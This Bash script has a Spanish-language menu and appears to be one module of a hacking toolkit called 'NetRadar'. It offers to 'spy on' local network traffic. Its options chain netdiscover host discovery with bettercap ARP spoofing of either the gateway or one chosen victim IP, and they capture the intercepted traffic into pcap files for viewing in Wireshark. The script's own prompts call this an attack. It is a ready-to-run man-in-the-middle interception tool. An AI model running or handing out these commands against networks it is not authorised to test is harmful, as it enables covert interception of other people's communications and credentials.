#!bin/bash

source requisitos/0.sh

Title
echo "[4] Espiar el Trafico de una Red Local"
echo
echo "============================"
echo "[1] Toda la Red            |"
echo "[2] Unico Dispositivo      |"
echo "[3] Anazlizar Fichero PCAP |"
echo "[4] Volver al Menu         |"
echo "============================"
echo
read -p "Elige una opcion: " opc1
	case $opc1 in
			1 )	echo
				ifconfig -a | sed 's/[ \t].*//;/^\(lo\|\)$/d; s/^\([^:]*\):/[*] \1/'
				echo
				read -p "[*] Pon la Interfaz de Red que estes utilizando (Ej: eth0): " interfaz
				Title
				echo "[#] Pulse Ctrl + c (Finalizar Ataque)"
				echo
				echo "========================================================================================="
				echo "                           Toda la Red esta siendo Sniffeado"
				echo "========================================================================================="
				scan_count=1
				filename="Sniff_Global_$scan_count.pcap"
				while [[ -e "requisitos/resultados/$filename" ]]; do
				((scan_count++))
				filename="Sniff_Global_$scan_count.pcap"
				done
				echo
				gw=$(ip route | grep default | awk '{print $3}')
				sudo bettercap -iface $interfaz -eval "set net.sniff.output requisitos/resultados/$filename; net.probe on; set arp.spoof targets $gw; arp.spoof on; set net.sniff.verbose false; net.sniff on"
				echo
				echo "[#] Ruta del Fichero que Almacena la Captura de todo el Trafico: [NetRadar/requisitos/resultados/$filename]"
				;;
			2 )	echo
				ifconfig -a | sed 's/[ \t].*//;/^\(lo\|\)$/d; s/^\([^:]*\):/[*] \1/'
				echo
				read -p "[*] Pon la Interfaz de Red que estes utilizando (Ej: eth0): " interfaz
				read -p "[*] Escribe la Ip de Red + la Mascara (Ej: 192.168.1.0/24 o 128.0.0.0/16): " opc1
				echo
				sudo netdiscover -i $interfaz -r $opc1 -P
				echo
				read -p "[*] Pon la IP del Objetivo (Ej: 192.168.1.1): " ip
				Title
				echo "[#] Pulse Ctrl + c (Finalizar Ataque)"
				echo
				echo "========================================================================================="
				echo "                      El Objetivo ($ip) esta siendo Sniffeado"
				echo "========================================================================================="
				scan_count=1
				filename="Sniff_($ip)_$scan_count.pcap"
				while [[ -e "requisitos/resultados/$filename" ]]; do
				((scan_count++))
				filename="Sniff_($ip)_$scan_count.pcap"
				done
				echo
				sudo bettercap -iface $interfaz -eval "set net.sniff.output requisitos/resultados/$filename; net.probe on; set arp.spoof targets $ip; arp.spoof on; set net.sniff.verbose false; set net.sniff.filter 'host $ip'; net.sniff on"
				echo
				echo "[#] Ruta del Fichero que Almacena la Captura de todo el Trafico: [NetRadar/requisitos/resultados/$filename]"
				;;
			3 )	echo
				ruta="requisitos/resultados"

				if [ ! -d "$ruta" ]; then
				echo "La ruta especificada no existe."
				exit 1
				fi

				archivos=("$ruta"/*)

				if [ ${#archivos[@]} -eq 0 ]; then
				echo "No hay archivos en la carpeta especificada."
				exit 1
				fi

				for i in "${!archivos[@]}"; do
				nombre_archivo=$(basename "${archivos[i]}")
				echo "$((i + 1)). $nombre_archivo"
				done

				echo

				echo -n "[*] Pon el número del fichero que deseas analizar: "
				read seleccion

				if [[ $seleccion =~ ^[0-9]+$ && $seleccion -ge 1 && $seleccion -le ${#archivos[@]} ]]; then
				archivo_seleccionado="${archivos[$((seleccion - 1))]}"
				echo "Ejecutando Wireshark en $archivo_seleccionado..."
				sudo wireshark "$archivo_seleccionado"
				else
				echo "Selección no válida. Debes ingresar un número válido."
				fi
				;;
			4 )	bash wifi_troll.sh
				;;
			* )	echo
				echo "$RRPLY No es una opcion valida"
	esac
echo
echo
echo "#####################"
echo "[1] Volver al Menu"
echo "[2] Volver a ejecutar"
echo "[3] Salir"
echo "#####################"
echo
read -p "Elige una opcion: " opc2
	case $opc2 in
			1 )	bash wifi_troll.sh
				;;
			2 )	bash requisitos/4.sh
				;;
			3 )	exit
				;;
			* )	echo
				echo "$RRPLY No es una opcion valida"
	esac
